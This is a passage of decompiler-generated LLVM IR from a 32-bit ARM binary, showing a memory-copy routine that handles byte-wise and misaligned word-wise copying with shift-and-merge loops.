  %v2_11ebc = phi i1 [ %v2_11eb8.pre, %bb136 ], [ %v1_11eb0, %bb135 ]
  %v1_11ebc = phi i1 [ %v1_11eb8.pre, %bb136 ], [ %v0_11eb0, %bb135 ]
  %v0_11eb8 = load i1, i1* @cpsr_z, align 1
  %v3_11eb8 = xor i1 %v2_11ebc, %v1_11ebc
  %v4_11eb8 = or i1 %v0_11eb8, %v3_11eb8
  br i1 %v4_11eb8, label %.thread121, label %bb137

bb137:                                            ; preds = %.thread120
  %v5_11eb8 = load i32, i32* @r1, align 4
  %v6_11eb8 = inttoptr i32 %v5_11eb8 to i8*
  %v7_11eb8 = load i8, i8* %v6_11eb8, align 1
  %v8_11eb8 = zext i8 %v7_11eb8 to i32
  store i32 %v8_11eb8, i32* %r3.global-to-local, align 4
  %v10_11eb8 = add i32 %v5_11eb8, 1
  store i32 %v10_11eb8, i32* @r1, align 4
  %v8_11ebc = inttoptr i32 %v7_11ebc to i8*
  store i8 %v7_11eb8, i8* %v8_11ebc, align 1
  %v9_11ebc = load i32, i32* %r0.global-to-local, align 4
  %v10_11ebc = add i32 %v9_11ebc, 1
  store i32 %v10_11ebc, i32* %r0.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %.thread120, %bb137
  %v2_11ec0 = load i8*, i8** %stack_var_-8, align 4
  %v3_11ec0 = ptrtoint i8* %v2_11ec0 to i32
  store i32 %v3_11ec0, i32* %r0.global-to-local, align 4
  ret i32 %v3_11ec0

dec_label_pc_11ec4:                               ; preds = %dec_label_pc_11e18
  %v1_11ec4 = sub nsw i32 4, %v1_11e18
  store i32 %v1_11ec4, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_11ec8 = icmp ult i32 %v1_11ec4, 2
  store i1 %v8_11ec8, i1* %cpsr_n.global-to-local, align 1
  %v1_11ecc = inttoptr i32 %v0_11e00 to i8*
  %v2_11ecc = load i8, i8* %v1_11ecc, align 1
  %v3_11ecc = zext i8 %v2_11ecc to i32
  store i32 %v3_11ecc, i32* %r3.global-to-local, align 4
  %v5_11ecc = add i32 %v0_11e00, 1
  store i32 %v5_11ecc, i32* @r1, align 4
  store i8 %v2_11ecc, i8* %v5_11e0c, align 1
  %v4_11ed0 = load i32, i32* %r0.global-to-local, align 4
  %v5_11ed0 = add i32 %v4_11ed0, 1
  store i32 %v5_11ed0, i32* %r0.global-to-local, align 4
  br i1 %v8_11ec8, label %.thread12, label %bb138

bb138:                                            ; preds = %dec_label_pc_11ec4
  %v9_11ec8 = icmp eq i32 %v1_11ec4, 2
  %v6_11ed4 = load i32, i32* @r1, align 4
  %v7_11ed4 = inttoptr i32 %v6_11ed4 to i8*
  %v8_11ed4 = load i8, i8* %v7_11ed4, align 1
  %v9_11ed4 = zext i8 %v8_11ed4 to i32
  store i32 %v9_11ed4, i32* %r3.global-to-local, align 4
  %v11_11ed4 = add i32 %v6_11ed4, 1
  store i32 %v11_11ed4, i32* @r1, align 4
  %v9_11ed8 = inttoptr i32 %v5_11ed0 to i8*
  store i8 %v8_11ed4, i8* %v9_11ed8, align 1
  %v10_11ed8 = load i32, i32* %r0.global-to-local, align 4
  %v11_11ed8 = add i32 %v10_11ed8, 1
  store i32 %v11_11ed8, i32* %r0.global-to-local, align 4
  br i1 %v9_11ec8, label %.thread12, label %bb139

bb139:                                            ; preds = %bb138
  %v8_11edc = load i32, i32* @r1, align 4
  %v9_11edc = inttoptr i32 %v8_11edc to i8*
  %v10_11edc = load i8, i8* %v9_11edc, align 1
  %v11_11edc = zext i8 %v10_11edc to i32
  store i32 %v11_11edc, i32* %r3.global-to-local, align 4
  %v13_11edc = add i32 %v8_11edc, 1
  store i32 %v13_11edc, i32* @r1, align 4
  %v11_11ee0 = inttoptr i32 %v11_11ed8 to i8*
  store i8 %v10_11edc, i8* %v11_11ee0, align 1
  %v12_11ee0 = load i32, i32* %r0.global-to-local, align 4
  %v13_11ee0 = add i32 %v12_11ee0, 1
  store i32 %v13_11ee0, i32* %r0.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb138, %dec_label_pc_11ec4, %bb139
  %v0_11f3c76 = phi i32 [ %v11_11ed8, %bb138 ], [ %v5_11ed0, %dec_label_pc_11ec4 ], [ %v13_11ee0, %bb139 ]
  %v0_11ee4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11ee4 = load i32, i32* @ip, align 4
  %v2_11ee4 = sub i32 %v0_11ee4, %v1_11ee4
  store i32 %v2_11ee4, i32* %r2.global-to-local, align 4
  %v4_11ee4 = xor i32 %v1_11ee4, %v0_11ee4
  %v5_11ee4 = xor i32 %v2_11ee4, %v0_11ee4
  %v6_11ee4 = and i32 %v5_11ee4, %v4_11ee4
  %v7_11ee4 = icmp slt i32 %v6_11ee4, 0
  store i1 %v7_11ee4, i1* %cpsr_v.global-to-local, align 1
  %v8_11ee4 = icmp slt i32 %v2_11ee4, 0
  store i1 %v8_11ee4, i1* %cpsr_n.global-to-local, align 1
  %v5_11ee8 = icmp slt i32 %v0_11ee4, %v1_11ee4
  br i1 %v5_11ee8, label %bb133, label %dec_label_pc_11eec

dec_label_pc_11eec:                               ; preds = %.thread12
  %v0_11eec = load i32, i32* @r1, align 4
  %v1_11eec = urem i32 %v0_11eec, 4
  store i32 %v1_11eec, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11eec = icmp eq i32 %v1_11eec, 0
  %extract.t124 = trunc i32 %v0_11eec to i2
  br i1 %v2_11eec, label %dec_label_pc_11e28, label %dec_label_pc_11ef4

dec_label_pc_11ef4:                               ; preds = %dec_label_pc_11e20, %dec_label_pc_11eec
  %v0_11f3c75 = phi i32 [ %v1_11e00, %dec_label_pc_11e20 ], [ %v0_11f3c76, %dec_label_pc_11eec ]
  %v0_11fe8 = phi i32 [ %v2_11e10, %dec_label_pc_11e20 ], [ %v2_11ee4, %dec_label_pc_11eec ]
  %v0_11efc.off0 = phi i2 [ %extract.t, %dec_label_pc_11e20 ], [ %extract.t124, %dec_label_pc_11eec ]
  %v0_11ef4 = phi i32 [ %v0_11e00, %dec_label_pc_11e20 ], [ %v0_11eec, %dec_label_pc_11eec ]
  %v1_11ef4 = and i32 %v0_11ef4, -4
  store i32 %v1_11ef4, i32* %r1.global-to-local, align 4
  %v1_11ef8 = inttoptr i32 %v1_11ef4 to i32*
  %v2_11ef8 = load i32, i32* %v1_11ef8, align 4
  store i32 %v2_11ef8, i32* @lr, align 4
  %v4_11ef8 = add i32 %v1_11ef4, 4
  store i32 %v4_11ef8, i32* %r1.global-to-local, align 4
  %v2_11fe0 = add i32 %v0_11fe8, -12
  %v4_11fe0 = sub i32 11, %v0_11fe8
  %v5_11fe0 = and i32 %v4_11fe0, %v0_11fe8
  %v6_11fe0 = icmp slt i32 %v5_11fe0, 0
  store i1 %v6_11fe0, i1* %cpsr_v.global-to-local, align 1
  %v7_11fe0 = icmp slt i32 %v2_11fe0, 0
  store i1 %v7_11fe0, i1* %cpsr_n.global-to-local, align 1
  %v5_11fe4 = icmp slt i32 %v0_11fe8, 12
  switch i2 %v0_11efc.off0, label %dec_label_pc_11f08 [
    i2 -1, label %dec_label_pc_11fe0
    i2 -2, label %dec_label_pc_11f74
  ]

dec_label_pc_11f08:                               ; preds = %dec_label_pc_11ef4
  br i1 %v5_11fe4, label %dec_label_pc_11f54, label %dec_label_pc_11f10

dec_label_pc_11f10:                               ; preds = %dec_label_pc_11f08
  store i32 %v2_11fe0, i32* %r2.global-to-local, align 4
  %v3_11f14 = load i32, i32* @r4, align 4
  store i32 %v3_11f14, i32* %stack_var_-16, align 4
  %v6_11f14 = load i32, i32* @r5, align 4
  store i32 %v6_11f14, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11f18

dec_label_pc_11f18:                               ; preds = %dec_label_pc_11f18.dec_label_pc_11f18_crit_edge, %dec_label_pc_11f10
  %v0_11f3c = phi i32 [ %v12_11f3c, %dec_label_pc_11f18.dec_label_pc_11f18_crit_edge ], [ %v0_11f3c75, %dec_label_pc_11f10 ]
  %v0_11f1c = phi i32 [ %v0_11f1c.pre, %dec_label_pc_11f18.dec_label_pc_11f18_crit_edge ], [ %v4_11ef8, %dec_label_pc_11f10 ]
  %v0_11f18 = phi i32 [ %v0_11f18.pre, %dec_label_pc_11f18.dec_label_pc_11f18_crit_edge ], [ %v2_11ef8, %dec_label_pc_11f10 ]
  %v3_11f18 = udiv i32 %v0_11f18, 256
  store i32 %v3_11f18, i32* %r3.global-to-local, align 4
  %v1_11f1c = inttoptr i32 %v0_11f1c to i32*
  %v2_11f1c = load i32, i32* %v1_11f1c, align 4
  store i32 %v2_11f1c, i32* %r4.global-to-local, align 4
  %v3_11f1c = add i32 %v0_11f1c, 4
  %v4_11f1c = inttoptr i32 %v3_11f1c to i32*
  %v5_11f1c = load i32, i32* %v4_11f1c, align 4
  store i32 %v5_11f1c, i32* %r5.global-to-local, align 4
  %v6_11f1c = add i32 %v0_11f1c, 8
  %v7_11f1c = inttoptr i32 %v6_11f1c to i32*
  %v8_11f1c = load i32, i32* %v7_11f1c, align 4
  store i32 %v8_11f1c, i32* %ip.global-to-local, align 4
  %v9_11f1c = add i32 %v0_11f1c, 12
  %v10_11f1c = inttoptr i32 %v9_11f1c to i32*
  %v11_11f1c = load i32, i32* %v10_11f1c, align 4
  store i32 %v11_11f1c, i32* @lr, align 4
  %v12_11f1c = add i32 %v0_11f1c, 16
  store i32 %v12_11f1c, i32* %r1.global-to-local, align 4
  %v4_11f20 = mul i32 %v2_11f1c, 16777216
  %v5_11f20 = or i32 %v4_11f20, %v3_11f18
  store i32 %v5_11f20, i32* %r3.global-to-local, align 4
  %v3_11f24 = udiv i32 %v2_11f1c, 256
  %v4_11f28 = mul i32 %v5_11f1c, 16777216
  %v5_11f28 = or i32 %v4_11f28, %v3_11f24
  store i32 %v5_11f28, i32* %r4.global-to-local, align 4
  %v3_11f2c = udiv i32 %v5_11f1c, 256
  %v4_11f30 = mul i32 %v8_11f1c, 16777216
  %v5_11f30 = or i32 %v4_11f30, %v3_11f2c
  store i32 %v5_11f30, i32* %r5.global-to-local, align 4
  %v3_11f34 = udiv i32 %v8_11f1c, 256
  %v4_11f38 = mul i32 %v11_11f1c, 16777216
  %v5_11f38 = or i32 %v4_11f38, %v3_11f34
  store i32 %v5_11f38, i32* @ip, align 4
  %v1_11f3c = inttoptr i32 %v0_11f3c to i32*
  store i32 %v5_11f20, i32* %v1_11f3c, align 4
  %v3_11f3c = add i32 %v0_11f3c, 4
  %v4_11f3c = inttoptr i32 %v3_11f3c to i32*
  %v5_11f3c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_11f3c, i32* %v4_11f3c, align 4
  %v6_11f3c = add i32 %v0_11f3c, 8
  %v7_11f3c = inttoptr i32 %v6_11f3c to i32*
  %v8_11f3c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_11f3c, i32* %v7_11f3c, align 4
  %v9_11f3c = add i32 %v0_11f3c, 12
  %v10_11f3c = inttoptr i32 %v9_11f3c to i32*
  %v11_11f3c = load i32, i32* @ip, align 4
  store i32 %v11_11f3c, i32* %v10_11f3c, align 4
  %v12_11f3c = add i32 %v0_11f3c, 16
  store i32 %v12_11f3c, i32* %r0.global-to-local, align 4
  %v0_11f40 = load i32, i32* %r2.global-to-local, align 4
  %v2_11f40 = add i32 %v0_11f40, -16
  store i32 %v2_11f40, i32* %r2.global-to-local, align 4
  %v6_11f44 = icmp slt i32 %v0_11f40, 16
  br i1 %v6_11f44, label %dec_label_pc_11f48, label %dec_label_pc_11f18.dec_label_pc_11f18_crit_edge

dec_label_pc_11f18.dec_label_pc_11f18_crit_edge:  ; preds = %dec_label_pc_11f18
  %v0_11f18.pre = load i32, i32* @lr, align 4
  %v0_11f1c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11f18

dec_label_pc_11f48:                               ; preds = %dec_label_pc_11f18
  %v2_11f48 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11f48, i32* @r4, align 4
  %v5_11f48 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_11f48, i32* @r5, align 4
  %v2_11f4c = add i32 %v0_11f40, -4
  store i32 %v2_11f4c, i32* %r2.global-to-local, align 4
  %v4_11f4c = add i32 %v0_11f40, 2147483632
  %v5_11f4c = and i32 %v2_11f4c, %v4_11f4c
  %v6_11f4c = icmp slt i32 %v5_11f4c, 0
  store i1 %v6_11f4c, i1* %cpsr_v.global-to-local, align 1
  %v7_11f4c = icmp slt i32 %v2_11f4c, 0
  store i1 %v7_11f4c, i1* %cpsr_n.global-to-local, align 1
  %v5_11f50 = icmp slt i32 %v2_11f40, -12
  br i1 %v5_11f50, label %dec_label_pc_11f6c, label %dec_label_pc_11f54

dec_label_pc_11f54:                               ; preds = %dec_label_pc_11f48, %dec_label_pc_11f08, %dec_label_pc_11f54
  %v1_11f60 = phi i32 [ %v4_11f60, %dec_label_pc_11f54 ], [ %v12_11f3c, %dec_label_pc_11f48 ], [ %v0_11f3c75, %dec_label_pc_11f08 ]
  %v0_11f54 = load i32, i32* @lr, align 4
  %v3_11f54 = udiv i32 %v0_11f54, 256
  store i32 %v3_11f54, i32* %ip.global-to-local, align 4
  %v0_11f58 = load i32, i32* %r1.global-to-local, align 4
  %v1_11f58 = inttoptr i32 %v0_11f58 to i32*
  %v2_11f58 = load i32, i32* %v1_11f58, align 4
  store i32 %v2_11f58, i32* @lr, align 4
  %v4_11f58 = add i32 %v0_11f58, 4
  store i32 %v4_11f58, i32* %r1.global-to-local, align 4
  %v4_11f5c = mul i32 %v2_11f58, 16777216
  %v5_11f5c = or i32 %v4_11f5c, %v3_11f54
  store i32 %v5_11f5c, i32* @ip, align 4
  %v2_11f60 = inttoptr i32 %v1_11f60 to i32*
  store i32 %v5_11f5c, i32* %v2_11f60, align 4
  %v3_11f60 = load i32, i32* %r0.global-to-local, align 4
  %v4_11f60 = add i32 %v3_11f60, 4
  store i32 %v4_11f60, i32* %r0.global-to-local, align 4
  %v0_11f64 = load i32, i32* %r2.global-to-local, align 4
  %v2_11f64 = add i32 %v0_11f64, -4
  store i32 %v2_11f64, i32* %r2.global-to-local, align 4
  %v6_11f68 = icmp slt i32 %v0_11f64, 4
  br i1 %v6_11f68, label %dec_label_pc_11f6c.loopexit, label %dec_label_pc_11f54

dec_label_pc_11f6c.loopexit:                      ; preds = %dec_label_pc_11f54
  %v4_11f64 = sub i32 3, %v0_11f64
  %v5_11f64 = and i32 %v4_11f64, %v0_11f64
  %v6_11f64 = icmp slt i32 %v5_11f64, 0
  %v7_11f64 = icmp slt i32 %v2_11f64, 0
  store i1 %v6_11f64, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_11f64, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_11f6c

dec_label_pc_11f6c:                               ; preds = %dec_label_pc_11f6c.loopexit, %dec_label_pc_11f48
  %v2_11eac113 = phi i32 [ %v4_11f60, %dec_label_pc_11f6c.loopexit ], [ %v12_11f3c, %dec_label_pc_11f48 ]
  %v0_11e9c109 = phi i32 [ %v2_11f64, %dec_label_pc_11f6c.loopexit ], [ %v2_11f4c, %dec_label_pc_11f48 ]
  %v0_11f6c = load i32, i32* %r1.global-to-local, align 4
  %v1_11f6c = add i32 %v0_11f6c, -3
  store i32 %v1_11f6c, i32* @r1, align 4
  br label %bb133

dec_label_pc_11f74:                               ; preds = %dec_label_pc_11ef4
  br i1 %v5_11fe4, label %dec_label_pc_11fc0, label %dec_label_pc_11f7c

dec_label_pc_11f7c:                               ; preds = %dec_label_pc_11f74
  store i32 %v2_11fe0, i32* %r2.global-to-local, align 4
  %v3_11f80 = load i32, i32* @r4, align 4
  store i32 %v3_11f80, i32* %stack_var_-16, align 4
  %v6_11f80 = load i32, i32* @r5, align 4
  store i32 %v6_11f80, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11f84

dec_label_pc_11f84:                               ; preds = %dec_label_pc_11f84.dec_label_pc_11f84_crit_edge, %dec_label_pc_11f7c
  %v0_11fa8 = phi i32 [ %v12_11fa8, %dec_label_pc_11f84.dec_label_pc_11f84_crit_edge ], [ %v0_11f3c75, %dec_label_pc_11f7c ]
  %v0_11f88 = phi i32 [ %v0_11f88.pre, %dec_label_pc_11f84.dec_label_pc_11f84_crit_edge ], [ %v4_11ef8, %dec_label_pc_11f7c ]
  %v0_11f84 = phi i32 [ %v0_11f84.pre, %dec_label_pc_11f84.dec_label_pc_11f84_crit_edge ], [ %v2_11ef8, %dec_label_pc_11f7c ]
  %v3_11f84 = udiv i32 %v0_11f84, 65536
  store i32 %v3_11f84, i32* %r3.global-to-local, align 4
  %v1_11f88 = inttoptr i32 %v0_11f88 to i32*
  %v2_11f88 = load i32, i32* %v1_11f88, align 4
  store i32 %v2_11f88, i32* %r4.global-to-local, align 4
  %v3_11f88 = add i32 %v0_11f88, 4
  %v4_11f88 = inttoptr i32 %v3_11f88 to i32*
  %v5_11f88 = load i32, i32* %v4_11f88, align 4
  store i32 %v5_11f88, i32* %r5.global-to-local, align 4
  %v6_11f88 = add i32 %v0_11f88, 8
  %v7_11f88 = inttoptr i32 %v6_11f88 to i32*
  %v8_11f88 = load i32, i32* %v7_11f88, align 4
  store i32 %v8_11f88, i32* %ip.global-to-local, align 4
  %v9_11f88 = add i32 %v0_11f88, 12
  %v10_11f88 = inttoptr i32 %v9_11f88 to i32*
  %v11_11f88 = load i32, i32* %v10_11f88, align 4
  store i32 %v11_11f88, i32* @lr, align 4
  %v12_11f88 = add i32 %v0_11f88, 16
  store i32 %v12_11f88, i32* %r1.global-to-local, align 4
  %v4_11f8c = mul i32 %v2_11f88, 65536
  %v5_11f8c = or i32 %v4_11f8c, %v3_11f84
  store i32 %v5_11f8c, i32* %r3.global-to-local, align 4
  %v3_11f90 = udiv i32 %v2_11f88, 65536
  %v4_11f94 = mul i32 %v5_11f88, 65536
  %v5_11f94 = or i32 %v4_11f94, %v3_11f90
  store i32 %v5_11f94, i32* %r4.global-to-local, align 4
  %v3_11f98 = udiv i32 %v5_11f88, 65536
  %v4_11f9c = mul i32 %v8_11f88, 65536
  %v5_11f9c = or i32 %v4_11f9c, %v3_11f98
  store i32 %v5_11f9c, i32* %r5.global-to-local, align 4
  %v3_11fa0 = udiv i32 %v8_11f88, 65536
  %v4_11fa4 = mul i32 %v11_11f88, 65536
  %v5_11fa4 = or i32 %v4_11fa4, %v3_11fa0
  store i32 %v5_11fa4, i32* @ip, align 4
  %v1_11fa8 = inttoptr i32 %v0_11fa8 to i32*
  store i32 %v5_11f8c, i32* %v1_11fa8, align 4
  %v3_11fa8 = add i32 %v0_11fa8, 4
  %v4_11fa8 = inttoptr i32 %v3_11fa8 to i32*
  %v5_11fa8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_11fa8, i32* %v4_11fa8, align 4
  %v6_11fa8 = add i32 %v0_11fa8, 8
  %v7_11fa8 = inttoptr i32 %v6_11fa8 to i32*
  %v8_11fa8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_11fa8, i32* %v7_11fa8, align 4
  %v9_11fa8 = add i32 %v0_11fa8, 12
  %v10_11fa8 = inttoptr i32 %v9_11fa8 to i32*
  %v11_11fa8 = load i32, i32* @ip, align 4
  store i32 %v11_11fa8, i32* %v10_11fa8, align 4
  %v12_11fa8 = add i32 %v0_11fa8, 16
  store i32 %v12_11fa8, i32* %r0.global-to-local, align 4
  %v0_11fac = load i32, i32* %r2.global-to-local, align 4
  %v2_11fac = add i32 %v0_11fac, -16
  store i32 %v2_11fac, i32* %r2.global-to-local, align 4
  %v6_11fb0 = icmp slt i32 %v0_11fac, 16
  br i1 %v6_11fb0, label %dec_label_pc_11fb4, label %dec_label_pc_11f84.dec_label_pc_11f84_crit_edge

dec_label_pc_11f84.dec_label_pc_11f84_crit_edge:  ; preds = %dec_label_pc_11f84
  %v0_11f84.pre = load i32, i32* @lr, align 4
  %v0_11f88.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11f84

dec_label_pc_11fb4:                               ; preds = %dec_label_pc_11f84
  %v2_11fb4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11fb4, i32* @r4, align 4
  %v5_11fb4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_11fb4, i32* @r5, align 4
  %v2_11fb8 = add i32 %v0_11fac, -4
  store i32 %v2_11fb8, i32* %r2.global-to-local, align 4
  %v4_11fb8 = add i32 %v0_11fac, 2147483632
  %v5_11fb8 = and i32 %v2_11fb8, %v4_11fb8
  %v6_11fb8 = icmp slt i32 %v5_11fb8, 0
  store i1 %v6_11fb8, i1* %cpsr_v.global-to-local, align 1
  %v7_11fb8 = icmp slt i32 %v2_11fb8, 0
  store i1 %v7_11fb8, i1* %cpsr_n.global-to-local, align 1
  %v5_11fbc = icmp slt i32 %v2_11fac, -12
  br i1 %v5_11fbc, label %dec_label_pc_11fd8, label %dec_label_pc_11fc0

dec_label_pc_11fc0:                               ; preds = %dec_label_pc_11fb4, %dec_label_pc_11f74, %dec_label_pc_11fc0
  %v1_11fcc = phi i32 [ %v4_11fcc, %dec_label_pc_11fc0 ], [ %v12_11fa8, %dec_label_pc_11fb4 ], [ %v0_11f3c75, %dec_label_pc_11f74 ]
  %v0_11fc0 = load i32, i32* @lr, align 4
  %v3_11fc0 = udiv i32 %v0_11fc0, 65536
  store i32 %v3_11fc0, i32* %ip.global-to-local, align 4
  %v0_11fc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_11fc4 = inttoptr i32 %v0_11fc4 to i32*
  %v2_11fc4 = load i32, i32* %v1_11fc4, align 4
  store i32 %v2_11fc4, i32* @lr, align 4
  %v4_11fc4 = add i32 %v0_11fc4, 4
  store i32 %v4_11fc4, i32* %r1.global-to-local, align 4
  %v4_11fc8 = mul i32 %v2_11fc4, 65536
  %v5_11fc8 = or i32 %v4_11fc8, %v3_11fc0
  store i32 %v5_11fc8, i32* @ip, align 4
  %v2_11fcc = inttoptr i32 %v1_11fcc to i32*
  store i32 %v5_11fc8, i32* %v2_11fcc, align 4
  %v3_11fcc = load i32, i32* %r0.global-to-local, align 4
  %v4_11fcc = add i32 %v3_11fcc, 4
  store i32 %v4_11fcc, i32* %r0.global-to-local, align 4
  %v0_11fd0 = load i32, i32* %r2.global-to-local, align 4
  %v2_11fd0 = add i32 %v0_11fd0, -4
  store i32 %v2_11fd0, i32* %r2.global-to-local, align 4
  %v6_11fd4 = icmp slt i32 %v0_11fd0, 4
  br i1 %v6_11fd4, label %dec_label_pc_11fd8.loopexit, label %dec_label_pc_11fc0

dec_label_pc_11fd8.loopexit:                      ; preds = %dec_label_pc_11fc0
  %v4_11fd0 = sub i32 3, %v0_11fd0
  %v5_11fd0 = and i32 %v4_11fd0, %v0_11fd0
  %v6_11fd0 = icmp slt i32 %v5_11fd0, 0
  %v7_11fd0 = icmp slt i32 %v2_11fd0, 0
  store i1 %v6_11fd0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_11fd0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_11fd8

dec_label_pc_11fd8:                               ; preds = %dec_label_pc_11fd8.loopexit, %dec_label_pc_11fb4
  %v2_11eac114 = phi i32 [ %v4_11fcc, %dec_label_pc_11fd8.loopexit ], [ %v12_11fa8, %dec_label_pc_11fb4 ]
  %v0_11e9c110 = phi i32 [ %v2_11fd0, %dec_label_pc_11fd8.loopexit ], [ %v2_11fb8, %dec_label_pc_11fb4 ]
  %v0_11fd8 = load i32, i32* %r1.global-to-local, align 4
  %v1_11fd8 = add i32 %v0_11fd8, -2
  store i32 %v1_11fd8, i32* @r1, align 4
  br label %bb133

dec_label_pc_11fe0:                               ; preds = %dec_label_pc_11ef4
  br i1 %v5_11fe4, label %dec_label_pc_1202c, label %dec_label_pc_11fe8

dec_label_pc_11fe8:                               ; preds = %dec_label_pc_11fe0
  store i32 %v2_11fe0, i32* %r2.global-to-local, align 4
  %v3_11fec = load i32, i32* @r4, align 4
  store i32 %v3_11fec, i32* %stack_var_-16, align 4
  %v6_11fec = load i32, i32* @r5, align 4
  store i32 %v6_11fec, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11ff0

dec_label_pc_11ff0:                               ; preds = %dec_label_pc_11ff0.dec_label_pc_11ff0_crit_edge, %dec_label_pc_11fe8
  %v0_12014 = phi i32 [ %v12_12014, %dec_label_pc_11ff0.dec_label_pc_11ff0_crit_edge ], [ %v0_11f3c75, %dec_label_pc_11fe8 ]
  %v0_11ff4 = phi i32 [ %v0_11ff4.pre, %dec_label_pc_11ff0.dec_label_pc_11ff0_crit_edge ], [ %v4_11ef8, %dec_label_pc_11fe8 ]
  %v0_11ff0 = phi i32 [ %v0_11ff0.pre, %dec_label_pc_11ff0.dec_label_pc_11ff0_crit_edge ], [ %v2_11ef8, %dec_label_pc_11fe8 ]
  %v3_11ff0 = udiv i32 %v0_11ff0, 16777216
  store i32 %v3_11ff0, i32* %r3.global-to-local, align 4
  %v1_11ff4 = inttoptr i32 %v0_11ff4 to i32*
  %v2_11ff4 = load i32, i32* %v1_11ff4, align 4
  store i32 %v2_11ff4, i32* %r4.global-to-local, align 4
  %v3_11ff4 = add i32 %v0_11ff4, 4
  %v4_11ff4 = inttoptr i32 %v3_11ff4 to i32*
  %v5_11ff4 = load i32, i32* %v4_11ff4, align 4
  store i32 %v5_11ff4, i32* %r5.global-to-local, align 4
  %v6_11ff4 = add i32 %v0_11ff4, 8
  %v7_11ff4 = inttoptr i32 %v6_11ff4 to i32*
  %v8_11ff4 = load i32, i32* %v7_11ff4, align 4
  store i32 %v8_11ff4, i32* %ip.global-to-local, align 4
  %v9_11ff4 = add i32 %v0_11ff4, 12
  %v10_11ff4 = inttoptr i32 %v9_11ff4 to i32*
  %v11_11ff4 = load i32, i32* %v10_11ff4, align 4
  store i32 %v11_11ff4, i32* @lr, align 4
  %v12_11ff4 = add i32 %v0_11ff4, 16
  store i32 %v12_11ff4, i32* %r1.global-to-local, align 4
  %v4_11ff8 = mul i32 %v2_11ff4, 256
  %v5_11ff8 = or i32 %v4_11ff8, %v3_11ff0
  store i32 %v5_11ff8, i32* %r3.global-to-local, align 4
  %v3_11ffc = udiv i32 %v2_11ff4, 16777216
  %v4_12000 = mul i32 %v5_11ff4, 256
  %v5_12000 = or i32 %v4_12000, %v3_11ffc
  store i32 %v5_12000, i32* %r4.global-to-local, align 4
  %v3_12004 = udiv i32 %v5_11ff4, 16777216
  %v4_12008 = mul i32 %v8_11ff4, 256
  %v5_12008 = or i32 %v4_12008, %v3_12004
  store i32 %v5_12008, i32* %r5.global-to-local, align 4
  %v3_1200c = udiv i32 %v8_11ff4, 16777216
  %v4_12010 = mul i32 %v11_11ff4, 256
  %v5_12010 = or i32 %v4_12010, %v3_1200c
  store i32 %v5_12010, i32* @ip, align 4
  %v1_12014 = inttoptr i32 %v0_12014 to i32*
  store i32 %v5_11ff8, i32* %v1_12014, align 4
  %v3_12014 = add i32 %v0_12014, 4
  %v4_12014 = inttoptr i32 %v3_12014 to i32*
  %v5_12014 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_12014, i32* %v4_12014, align 4
  %v6_12014 = add i32 %v0_12014, 8
  %v7_12014 = inttoptr i32 %v6_12014 to i32*
  %v8_12014 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_12014, i32* %v7_12014, align 4
  %v9_12014 = add i32 %v0_12014, 12
  %v10_12014 = inttoptr i32 %v9_12014 to i32*
  %v11_12014 = load i32, i32* @ip, align 4
  store i32 %v11_12014, i32* %v10_12014, align 4
  %v12_12014 = add i32 %v0_12014, 16
  store i32 %v12_12014, i32* %r0.global-to-local, align 4
  %v0_12018 = load i32, i32* %r2.global-to-local, align 4
  %v2_12018 = add i32 %v0_12018, -16
  store i32 %v2_12018, i32* %r2.global-to-local, align 4
  %v6_1201c = icmp slt i32 %v0_12018, 16
  br i1 %v6_1201c, label %dec_label_pc_12020, label %dec_label_pc_11ff0.dec_label_pc_11ff0_crit_edge

dec_label_pc_11ff0.dec_label_pc_11ff0_crit_edge:  ; preds = %dec_label_pc_11ff0
  %v0_11ff0.pre = load i32, i32* @lr, align 4
  %v0_11ff4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11ff0

dec_label_pc_12020:                               ; preds = %dec_label_pc_11ff0
  %v2_12020 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12020, i32* @r4, align 4
  %v5_12020 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_12020, i32* @r5, align 4
  %v2_12024 = add i32 %v0_12018, -4
  store i32 %v2_12024, i32* %r2.global-to-local, align 4
  %v4_12024 = add i32 %v0_12018, 2147483632
  %v5_12024 = and i32 %v2_12024, %v4_12024
  %v6_12024 = icmp slt i32 %v5_12024, 0
  store i1 %v6_12024, i1* %cpsr_v.global-to-local, align 1
  %v7_12024 = icmp slt i32 %v2_12024, 0
  store i1 %v7_12024, i1* %cpsr_n.global-to-local, align 1
  %v5_12028 = icmp slt i32 %v2_12018, -12
  br i1 %v5_12028, label %dec_label_pc_12044, label %dec_label_pc_1202c

dec_label_pc_1202c:                               ; preds = %dec_label_pc_11fe0, %dec_label_pc_12020, %dec_label_pc_1202c
  %v1_12038 = phi i32 [ %v4_12038, %dec_label_pc_1202c ], [ %v0_11f3c75, %dec_label_pc_11fe0 ], [ %v12_12014, %dec_label_pc_12020 ]
  %v0_1202c = load i32, i32* @lr, align 4
  %v3_1202c = udiv i32 %v0_1202c, 16777216
  store i32 %v3_1202c, i32* %ip.global-to-local, align 4
  %v0_12030 = load i32, i32* %r1.global-to-local, align 4
